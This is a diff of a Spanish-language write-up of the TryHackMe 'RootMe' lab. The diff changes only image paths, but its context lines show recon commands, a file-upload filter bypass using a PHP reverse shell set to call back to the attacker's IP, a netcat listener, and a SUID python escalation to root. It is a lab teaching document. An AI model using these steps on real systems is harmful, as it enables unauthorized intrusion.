@@ -83,7 +83,7 @@ nmap -sC -sV -Pn 10.65.147.166 -oN nmap_rootme.txt
 - **`22/tcp` OPEN (SSH):** `OpenSSH 8.2p1 Ubuntu` (Acceso remoto seguro; requiere credenciales que aún no se tienen).
 - **`80/tcp` OPEN (HTTP):** `Apache httpd 2.4.41 (Ubuntu)`. Este servidor web fue el punto de entrada.
 
-![Etapa 2: Enumeración Web y Descubrimiento de Directorios Ocultos (Gobuster)](README/Captura_1_cleaned.png)
+![Etapa 2: Enumeración Web y Descubrimiento de Directorios Ocultos (Gobuster)](Captura_1_cleaned.png)
 
 Etapa 2: Enumeración Web y Descubrimiento de Directorios Ocultos (Gobuster)
 
@@ -113,7 +113,7 @@ gobuster dir -u http://10.65.147.166 -w /usr/share/wordlists/dirb/common.txt -x 
 - `/css`, `/js`, `/panel`, `/uploads` (**Status: 301 Moved Permanently**): El código `301` indica que son **directorios reales** en el servidor. Al descubrir **`/panel/`** (un formulario de subida oculto) y **`/uploads/`** (la carpeta donde se guardan los archivos subidos), se encuentra el vector de ataque.
 - `/.htaccess`, `/server-status` (**Status: 403 Forbidden**): Existen en el servidor, pero Apache deniega la lectura.
 
-![Reconocimiento Nmap y Gobuster](README/Captura_2_cleaned.png)
+![Reconocimiento Nmap y Gobuster](Captura_2_cleaned.png)
 
 ---
 
@@ -132,15 +132,15 @@ echo 'test' > prueba.txt
 
 Al subir `prueba.txt` en `/panel/`, el servidor respondió *"O arquivo foi upado com sucesso!"* (traducido al español significa “¡El archivo se subió correctamente!”) y se puede ver dicho archivo, publicado dentro de `http://10.65.147.166/uploads/`.
 
-![Captura_3_cleaned.png](README/Captura_3_cleaned.png)
+![Captura_3_cleaned.png](Captura_3_cleaned.png)
 
-![Captura_6_cleaned.png](README/Captura_6_cleaned.png)
+![Captura_6_cleaned.png](Captura_6_cleaned.png)
 
-![Captura_7_cleaned.png](README/Captura_7_cleaned.png)
+![Captura_7_cleaned.png](Captura_7_cleaned.png)
 
-![Captura_8_cleaned.png](README/Captura_8_cleaned.png)
+![Captura_8_cleaned.png](Captura_8_cleaned.png)
 
-![Captura_9_cleaned.png](README/Captura_9_cleaned.png)
+![Captura_9_cleaned.png](Captura_9_cleaned.png)
 
 #### 3.2. Qué pasa al subir un archivo `.php` y cómo hacer el Bypass
 
@@ -162,9 +162,9 @@ nano shell.php5
 | `$ip = '192.168.131.47';` | **Dirección IP de la VM Kali en la VPN (`tun0`)**. Le indica al servidor víctima a qué dirección IP debe enviar la consola remota. |
 | `$port = 1234;` | **Puerto TCP local** donde la máquina Kali estará esperando la llamada. |
 
-![Captura_10_cleaned.png](README/Captura_10_cleaned.png)
+![Captura_10_cleaned.png](Captura_10_cleaned.png)
 
-![Captura_11_cleaned.png](README/Captura_11_cleaned.png)
+![Captura_11_cleaned.png](Captura_11_cleaned.png)
 
 #### 3.3. Recepción de la Reverse Shell con Netcat
 
@@ -185,7 +185,7 @@ nc -lvnp 1234
 
 Al hacer clic sobre `shell.php5` dentro de `http://10.65.147.166/uploads/`, el servidor ejecuta el script PHP y la terminal de Netcat recibe el control remoto del servidor bajo el usuario `www-data`.
 
-![Captura_12_cleaned.png](README/Captura_12_cleaned.png)
+![Captura_12_cleaned.png](Captura_12_cleaned.png)
 
 ---
 
@@ -213,7 +213,7 @@ head -c 9 /var/www/user.txt; echo "...[REDACTED]"
 | `whoami && id` | Muestra nuestro nombre de usuario actual (`www-data`) y su identificador de permisos (`uid=33`). |
 | `head -c 9 /var/www/user.txt` | Imprime solo los primeros 9 caracteres del archivo (`THM{y...[REDACTED]`) para demostrar la captura en el informe sin exponer la *flag* completa en GitHub. |
 
-![Evidencia de acceso www-data y user.txt](README/Captura_13_cleaned.png)
+![Evidencia de acceso www-data y user.txt](Captura_13_cleaned.png)
 
 ---
 
@@ -235,7 +235,7 @@ find / -user root -perm /4000 2>/dev/null
 
 En la lista devuelta por `find`, aparece un binario que jamás debería tener permiso SUID: **`/usr/bin/python2.7`** (`/usr/bin/python`).
 
-![Enumeración de binarios SUID](README/Captura_14_cleaned.png)
+![Enumeración de binarios SUID](Captura_14_cleaned.png)
 
 Como Python tiene el permiso SUID de `root`, cualquier comando que se le pida ejecutar a Python, lo hará con nivel de superusuario. Consultando la base de datos [GTFOBins](https://gtfobins.github.io/gtfobins/python/#suid), se ejecuta el siguiente *exploit*:
 
@@ -255,7 +255,7 @@ head -c 9 /root/root.txt; echo "...[REDACTED]"
 
 Al ejecutar `whoami && id`, el sistema confirma que uno es **`root`** (`euid=0(root)`), logrando leer la bandera final en `/root/root.txt` (`THM{p[REDACTED]`) y completando el laboratorio.
 
-![Escalada de privilegios a root y root.txt](README/Captura_15_cleaned.png)
+![Escalada de privilegios a root y root.txt](Captura_15_cleaned.png)
 
 ---
 
